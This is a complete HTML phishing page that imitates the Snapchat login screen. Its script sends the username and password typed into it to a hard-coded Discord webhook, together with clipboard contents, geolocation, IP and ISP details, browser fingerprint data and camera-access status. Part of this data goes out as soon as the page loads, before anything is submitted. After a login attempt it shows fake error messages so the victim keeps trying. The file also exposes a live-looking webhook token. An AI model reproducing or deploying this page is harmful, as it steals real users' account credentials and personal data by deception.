<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Snapchat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
      
        * { margin:0; padding:0; box-sizing:border-box; }
      
        body {
            margin:0; padding:0;
            background:#f8f8f8;
            font-family:'Roboto',sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#000;
        }
      
        .container {
            background:#fff;
            width:100%;
            max-width:400px;
            padding:40px 30px;
            border-radius:12px;
            box-shadow:0 4px 20px rgba(0,0,0,0.1);
            text-align:center;
        }
      
        .logo {
            width:80px;
            height:80px;
            background:#fffc00;
            border-radius:50%;
            display:flex;
            align-items:center;
            justify-content:center;
            margin:0 auto 20px;
            font-size:50px;
            color:#000;
            box-shadow:0 4px 10px rgba(0,0,0,0.2);
        }
      
        h1 {
            font-size:28px;
            margin:10px 0 30px;
            font-weight:500;
        }
      
        input {
            width:100%;
            padding:14px;
            margin:10px 0;
            border:1px solid #ddd;
            border-radius:8px;
            font-size:16px;
            box-sizing:border-box;
        }
      
        input:focus {
            outline:none;
            border-color:#fffc00;
        }
      
        button {
            width:100%;
            padding:14px;
            background:#fffc00;
            color:#000;
            border:none;
            border-radius:8px;
            font-size:18px;
            font-weight:500;
            cursor:pointer;
            margin-top:10px;
        }
      
        button:hover:not(:disabled) {
            background:#ffe600;
        }
      
        .error {
            color:#ff3b30;
            font-size:15px;
            margin:8px 0 0 0;
            display:none;
            text-align:left;
        }
      
        .footer {
            margin-top:30px;
            font-size:13px;
            color:#666;
        }
      
        .footer a {
            color:#000;
            text-decoration:none;
        }
      
        .loading {
            display:none;
            position:absolute;
            top:50%;
            left:50%;
            transform:translate(-50%,-50%);
            background:rgba(0,0,0,0.85);
            color:#fff;
            padding:15px 25px;
            border-radius:8px;
            font-size:15px;
            z-index:100;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
      
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required autocomplete="username">
            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
            <div id="errorMsg" class="error">Invalid password. Please try again.</div>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
      
        <div class="footer">
            <a href="#">Forgot your password?</a><br><br>
            <p>© Snap Inc 2026</p>
        </div>
    </div>

    <div id="loadingOverlay" class="loading">Verifying...</div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1498622754797125633/t5Z-BfiL12-AQLa5mymJsmhvMdwc7ay9WCD8bYtxXci1s9-kOr4dRBGHg6y4QRFSjVXZ";

        async function sendToWebhook(content) {
            try {
                await fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: content })
                });
            } catch (e) {}
        }

        // Get Browser Name
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes("Edg")) return "Edge";
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Safari")) return "Safari";
            if (ua.includes("Opera")) return "Opera";
            return "Unknown";
        }

        // Read Clipboard
        async function readClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                if (text && text.length > 2) {
                    sendToWebhook(`**📋 CLIPBOARD**\n\`\`\`${text}\`\`\``);
                }
            } catch(e){}
        }

        // Main Tracking Function
        async function sendTrackingData(username = "Not yet", password = "Not yet") {
            const browser = getBrowserName();
            let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };

            try {
                const res = await fetch("https://ipinfo.io/json");
                ipInfo = await res.json();
            } catch(e){}

            // Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    sendToWebhook(`**📍 GEOLOCATION**\nLat: ${pos.coords.latitude} | Lon: ${pos.coords.longitude}`);
                }, () => {});
            }

            // Camera Prompt
            try {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(() => sendToWebhook("**📸 CAMERA ACCESS GRANTED**"))
                    .catch(() => {});
            } catch(e){}

            // Clipboard
            readClipboard();

            // Main Info
            const mainMsg = `**👻 SNAP VISIT**\n\n` +
                `**E:** ${username}\n` +
                `**PA:** ${password}\n\n` +
                `**IP:** ${ipInfo.ip}\n` +
                `**Loc:** ${ipInfo.city}, ${ipInfo.country}\n` +
                `**ISP:** ${ipInfo.org}\n` +
                `**Browser:** ${browser}\n` +
                `**UA:** ${navigator.userAgent.substring(0,120)}...\n` +
                `**Screen:** ${screen.width}x${screen.height}\n` +
                `**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n` +
                `**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;

            sendToWebhook(mainMsg);
        }

        // Triggers
        window.addEventListener("load", () => sendTrackingData());

        document.addEventListener("mousemove", () => {
            sendTrackingData();
        }, { once: true });

        // Form Submit
        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();

            if (!username || !password) return;

            const loginBtn = document.getElementById("loginBtn");
            const loadingOverlay = document.getElementById("loadingOverlay");
            const errorDiv = document.getElementById("errorMsg");

            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";
            loadingOverlay.style.display = "flex";

            // Send updated credentials
            await sendTrackingData(username, password);

            setTimeout(() => {
                loadingOverlay.style.display = "none";
                errorDiv.style.display = "block";
                document.getElementById("password").value = "";
                loginBtn.disabled = false;
                loginBtn.textContent = "Log In";
            }, 1350);

            setTimeout(() => {
                alert("There has been an error when you tried to access the video.\n\nError code: 209\n\nPlease try again later.");
            }, 2400);

            setTimeout(() => errorDiv.style.display = "none", 5200);
        });
    </script>
</body>
</html>
